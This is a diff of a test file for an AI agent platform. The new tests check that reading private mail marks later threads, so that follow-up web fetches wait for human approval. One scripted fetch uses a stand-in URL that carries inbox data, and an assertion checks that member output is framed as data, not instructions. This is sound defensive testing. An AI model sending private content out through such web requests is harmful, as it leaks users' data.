@@ -5,11 +5,12 @@ import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
 // Crews whose members act (O11, CREW_EXECUTION.md §8): each part is its
 // own task in its own thread, run by the member with its own tools,
 // approvals and the job's grants; the worker joins the results into the
-// job's thread. OT-CREW-01…09 and 11 on the scripted model and PGlite.
+// job's thread. OT-CREW-01…09, 11 and 12 on the scripted model and PGlite.
 
 const fixtures = vi.hoisted(() => ({
   user: "",
   drafts: [] as { to: string[] }[],
+  web: [] as string[],
   offered: [] as string[][],
   prompts: [] as string[],
 }))
@@ -22,8 +23,17 @@ vi.mock("@/lib/secrets", async (original) => ({
   ...(await original<typeof import("@/lib/secrets")>()),
   isSecretsConfigured: () => true,
 }))
+vi.mock("@/lib/web", async (original) => ({
+  ...(await original<typeof import("@/lib/web")>()),
+  isWebConfigured: () => true,
+  webFetch: async (url: string) => (
+    fixtures.web.push(url),
+    { url, title: "x", markdown: "x" }
+  ),
+}))
 vi.mock("@/lib/connectors", async (original) => ({
   ...(await original<typeof import("@/lib/connectors")>()),
+  gmailRead: async (_u: string, id: string) => ({ id, text: "Private mail" }),
   gmailDraft: async (_u: string, input: { to: string[] }) => {
     fixtures.drafts.push(input)
     const id = `d${fixtures.drafts.length}`
@@ -60,7 +70,9 @@ vi.mock("@/lib/models", async (original) => ({
 
 import { approveMandate, revokeMandate, stopCrew } from "@/actions/mandates"
 import { enqueueApproval } from "@/lib/agent/queue"
+import { privateContentSeen, untrustedSeen } from "@/lib/agent/tools"
 import { dispatchCrew, reviewCrews } from "@/lib/operator/crews"
+import { CREW_CONTEXT, CREW_PRIVATE } from "@/lib/operator/marker"
 import { reviewMandates } from "@/lib/operator/loop"
 import { fillPlaybook, PLAYBOOKS } from "@/lib/operator/playbooks"
 import { getInbox } from "@/queries/inbox"
@@ -153,6 +165,7 @@ const parts = () =>
 
 beforeEach(async () => {
   fixtures.drafts.length = 0
+  fixtures.web.length = 0
   fixtures.offered.length = 0
   fixtures.prompts.length = 0
   w = await world()
@@ -369,6 +382,124 @@ describe("dependencies and the join (OT-CREW-05, OT-CREW-06)", () => {
     expect(text).toContain("Done")
     // Members' text is data, not instructions
     expect(text).toContain("not instructions")
+  })
+})
+
+describe("taint crosses threads (OT-CREW-12)", () => {
+  const URL = "https://x.example/?d=inbox"
+  // [part:mail] reads mail, [part:web] reads the web, the rest only write
+  const script = () => {
+    model.script = (prompt, results) =>
+      prompt.includes("[part:web]")
+        ? results === 0
+          ? call("web_fetch", { url: URL }, "w1")
+          : say("Looked it up.")
+        : prompt.includes("[part:mail]")
+          ? results === 0
+            ? call("gmail_read", { id: "m1" }, "g1")
+            : say("The mail says: Private mail.")
+          : say("Passed on.")
+  }
+  const texts = async (threadId: string) =>
+    (
+      await w.q<{ parts: { text: string }[] }>(
+        "select parts from kriya.messages where thread_id = $1 and role = 'user' order by created_at",
+        [threadId]
+      )
+    ).map((m) => m.parts[0].text)
+  const asks = () =>
+    w.q<{ thread_id: string; tool_name: string }>(
+      "select thread_id, tool_name from kriya.approvals where status = 'pending'"
+    )
+  // Runs parts in order: each pass of the worker starts the next one
+  async function settle(rounds: number) {
+    for (let i = 0; i < rounds; i++) {
+      await drain()
+      await reviewCrews()
+    }
+    await drain()
+  }
+
+  it("a dependent part's web read waits for approval after a member read private mail", async () => {
+    const { thread } = await squadJob()
+    await dispatchCrew(lead(thread), {
+      parts: [
+        part("mail", "a2", "[part:mail] Read the mail"),
+        part("web", "a3", "[part:web] Look it up", ["mail"]),
+      ],
+    })
+    script()
+    await settle(1)
+    const [, web] = await parts()
+    expect(fixtures.web).toEqual([])
+    expect(await asks()).toEqual([{ thread_id: web.thread_id, tool_name: "web_fetch" }])
+    await reviewCrews()
+    expect((await parts())[1].status).toBe("needs_approval")
+    const [brief] = await texts(web.thread_id)
+    expect(brief).toContain(CREW_PRIVATE)
+    const seen = [{ role: "user" as const, content: brief }]
+    expect(privateContentSeen(seen)).toBe(true)
+    expect(untrustedSeen(seen)).toBe(true)
+  })
+
+  it("a part that read nothing private is unchanged, and its report stays untrusted", async () => {
+    const { thread } = await squadJob()
+    await dispatchCrew(lead(thread), {
+      parts: [
+        part("plain", "a2", "Write a note"),
+        part("web", "a3", "[part:web] Look it up", ["plain"]),
+      ],
+    })
+    script()
+    await settle(1)
+    const [plain, web] = await parts()
+    expect(fixtures.web).toEqual([URL])
+    expect(await asks()).toEqual([])
+    // The first brief quotes nothing, so it reads as it always did
+    expect((await texts(plain.thread_id))[0]).not.toContain(CREW_CONTEXT)
+    const [brief] = await texts(web.thread_id)
+    expect(brief).not.toContain(CREW_PRIVATE)
+    const seen = [{ role: "user" as const, content: brief }]
+    expect(privateContentSeen(seen)).toBe(false)
+    expect(untrustedSeen(seen)).toBe(true)
+  })
+
+  it("the mark survives a chain of parts", async () => {
+    const { thread } = await squadJob()
+    await dispatchCrew(lead(thread), {
+      parts: [
+        part("mail", "a2", "[part:mail] Read the mail"),
+        part("pass", "a3", "Pass it on", ["mail"]),
+        part("web", "a2", "[part:web] Look it up", ["pass"]),
+      ],
+    })
+    script()
+    await settle(2)
+    const web = (await parts()).find((p) => p.key === "web")!
+    expect(fixtures.web).toEqual([])
+    expect(await asks()).toEqual([{ thread_id: web.thread_id, tool_name: "web_fetch" }])
+  })
+
+  it("the join carries the mark to the lead and into the next round's briefs", async () => {
+    const { thread } = await squadJob()
+    await dispatchCrew(lead(thread), {
+      parts: [part("mail", "a2", "[part:mail] Read the mail")],
+    })
+    script()
+    await settle(1)
+    expect((await texts(thread)).at(-1)).toContain(CREW_PRIVATE)
+
+    // The lead's own web read in this thread now waits
+    await w.turn("[part:web] Check it online", thread)
+    expect(fixtures.web).toEqual([])
+    expect(await asks()).toEqual([{ thread_id: thread, tool_name: "web_fetch" }])
+
+    // The lead could copy the report into a brief: round 2 is marked too
+    await dispatchCrew(lead(thread), { parts: [part("next", "a3", "[part:web] Go on")] })
+    const next = (await parts()).find((p) => p.key === "next")!
+    expect((await texts(next.thread_id))[0]).toContain(CREW_PRIVATE)
+    await drain()
+    expect(fixtures.web).toEqual([])
   })
 })
 
